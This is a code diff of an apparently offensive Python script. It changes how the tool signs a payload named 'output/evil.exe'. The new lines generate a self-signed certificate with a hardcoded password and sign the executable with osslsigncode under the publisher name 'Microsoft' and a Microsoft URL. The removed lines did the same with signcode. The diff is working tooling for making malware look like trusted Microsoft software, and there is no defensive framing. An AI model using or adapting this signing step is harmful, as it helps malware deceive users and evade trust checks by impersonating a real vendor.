@@ -3,9 +3,6 @@
 import os, sys
 
 def start():
-    os.system("openssl pkcs12 -in authenticode.pfx -nocerts -nodes -out key.pem")
-    os.system("openssl rsa -in key.pem -outform PVK -pvk-strong -out authenticode.pvk")
-    os.system("openssl pkcs12 -in authenticode.pfx -nokeys -nodes -out cert.pem")
-    os.system("openssl crl2pkcs7 -nocrl -certfile cert.pem -outform DER -out authenticode.spc")
-
-    os.system("signcode -spc authenticode.spc -v authenticode.pvk -a sha1 -$ commercial -n Microsoft -i http://www.Microsoft.com/ -t http://timestamp.verisign.com/scripts/timstamp.dll -tr 10 output/evil.*")
+    print('[!] set password as "toor"')
+    os.system("openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365")
+    os.system('osslsigncode sign -certs "cert.pem" -key "key.pem" -pass "toor" -n "Microsoft" -i "https://www.Microsoft.com" -t "http://timestamp.comodoca.com/authenticode" -in "output/evil.exe" -out "output/signed.exe"')
